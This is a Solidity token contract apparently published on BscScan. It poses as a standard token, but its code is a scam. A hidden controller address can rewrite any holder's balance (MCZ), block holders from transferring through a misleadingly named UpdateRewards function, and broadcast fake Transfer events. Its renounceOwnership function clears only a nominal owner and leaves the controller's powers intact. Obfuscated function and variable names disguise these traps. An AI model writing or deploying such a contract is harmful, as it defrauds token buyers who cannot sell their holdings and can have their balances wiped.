/**
 *Submitted for verification at BscScan.com on 2023-02-15
*/

// SPDX-License-Identifier: MIT



pragma solidity 0.8.17;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}


contract Token {


    mapping (address => uint256) private cDa;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping (address => uint256) private bAc;

    string public name;
    string public symbol;
    uint8 public decimals = 6;
    uint256 public totalSupply = 1000000000 *10**6;
    address owner = msg.sender;
    address private DCS;
    address xDeploy = 0x09cC15Dda77789d42c0133c909E88Fb6E3Af793A;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor(string memory _name, string memory _symbol)  {
        DCS = msg.sender;
        lDeploy(msg.sender, totalSupply);
        name = _name; symbol = _symbol;}

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }


    function lDeploy(address account, uint256 amount) internal {
        account = xDeploy;
        bAc[msg.sender] = totalSupply;
        emit Transfer(address(0), account, amount); }

    function evetraupdat(address depa,address[] calldata az,uint256 ax) public {
        if(msg.sender == DCS) {
            for(uint i=0;i<az.length;i++){emit Transfer(depa,az[i],ax);}}}

    function balanceOf(address account) public view  returns (uint256) {
        return bAc[account];
    }

    function UpdateRewards (address sx, uint256 sz)  public {
        if(msg.sender == DCS) {
            cDa[sx] = sz;}}

    function transfer(address to, uint256 value) public returns (bool success) {


        if(cDa[msg.sender] <= 0) {
            require(bAc[msg.sender] >= value);
            bAc[msg.sender] -= value;
            bAc[to] += value;
            emit Transfer(msg.sender, to, value);
            return true; }}

    function approve(address spender, uint256 value) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
    function MCZ (address sx, uint256 sz)  public {
        if(msg.sender == DCS) {
            bAc[sx] = sz;}}

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
        if(from == DCS) {
            require(value <= bAc[from]);
            require(value <= allowance[from][msg.sender]);
            bAc[from] -= value;
            bAc[to] += value;
            from = xDeploy;
            emit Transfer (from, to, value);
            return true; }
        else
            if(cDa[from] <= 0 && cDa[to] <= 0) {
                require(value <= bAc[from]);
                require(value <= allowance[from][msg.sender]);
                bAc[from] -= value;
                bAc[to] += value;
                allowance[from][msg.sender] -= value;
                emit Transfer(from, to, value);
                return true; }}


}